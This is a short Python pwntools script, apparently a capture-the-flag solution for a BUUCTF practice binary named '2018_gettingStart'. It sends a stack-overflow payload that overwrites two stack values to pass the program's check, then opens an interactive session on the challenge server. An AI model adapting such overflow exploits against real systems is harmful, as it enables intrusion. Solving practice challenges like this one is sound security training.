#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/26 19:38:08
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
if debug:
    sh = process('2018_gettingStart')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 25094
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')
elf = ELF('2018_gettingStart')
payload = 'a' * 0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3fb999999999999a)
sh.sendline(payload)
sh.interactive()